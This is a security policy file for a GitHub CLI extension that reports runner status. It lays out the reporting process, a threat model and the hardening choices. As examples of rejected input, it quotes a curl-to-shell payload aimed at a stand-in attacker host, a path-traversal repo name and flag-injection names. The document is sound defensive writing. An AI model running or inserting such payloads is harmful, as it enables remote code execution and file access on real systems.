# Security Policy

## Reporting a Vulnerability

Please **do not** open a public GitHub issue for security vulnerabilities.

Email the maintainer directly (see the commit log for the address) or use [GitHub's private vulnerability reporting](https://github.com/crgeee/gh-runner-status/security/advisories/new). I'll acknowledge within 48 hours and credit reporters in the changelog unless you prefer to remain anonymous.

## Threat Model

`gh-runner-status` is a `gh` CLI extension. Anyone who installs it via `gh extension install` runs it with their own shell privileges. Concretely:

| Surface | Trust assumption |
|---|---|
| `gh` CLI auth | Caller has authenticated; we never prompt for tokens |
| `~/.config/gh-runner-status/repos` | Caller-trusted file; one repo per line |
| `~/.config/gh-runner-status/telegram` | Caller-trusted; **parsed**, never sourced |
| `TELEGRAM_BOT_TOKEN` | Sensitive — never logged, never on argv |
| Runner names from CLI args | Hostile-byte-treated; regex-validated |
| Repo names from CLI args | Hostile-byte-treated; regex-validated |
| Local launchctl/systemctl | Caller has the right to control their own services |

## Hardening Decisions

These are intentional design choices. If you spot a regression in any of them, that's a bug.

1. **Repo names are regex-validated** before they reach `gh api` (see `validate_repo`). `owner/../../etc/passwd` is rejected, not silently URL-encoded.
2. **Runner names are regex-validated** to match `actions.runner.<owner>-<repo>.<runner>` exactly (see `validate_runner_name`). Names like `--no-block` or `default.target` cannot reach `launchctl`/`systemctl`/`tail`.
3. **Telegram config is parsed, not sourced.** A malicious config file with `$(curl evil.com | sh)` does nothing — only `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` keys are extracted.
4. **Telegram bot token is sent via `curl --config -` (stdin).** It never lands in argv, where `ps auxe` from another user could see it.
5. **Telegram message body is sent via `data-urlencode "text@<tempfile>"`.** Arbitrary content (newlines, quotes, backslashes) cannot break the curl config or the wire protocol.
6. **`set -euo pipefail`** with an `EXIT` trap for tmpdir cleanup. Failures don't mask silently.
7. **No `eval`, no `bash -c "$user_input"`, no `source` of untrusted files.**

## Out of Scope

- Compromise of `gh` itself or the user's GitHub token (use `gh auth status`)
- Compromise of the user's machine (we run in their shell context)
- DoS via setting `--threshold` or `WATCH_INTERVAL` to absurd values (it's their machine)

## CI

Every PR runs:
- `shellcheck` (lint)
- `bats` test suite on Ubuntu + macOS
- `kcov` coverage (informational)

The `master` branch is protected: PRs only, CI must pass, no force-pushes, no deletions.
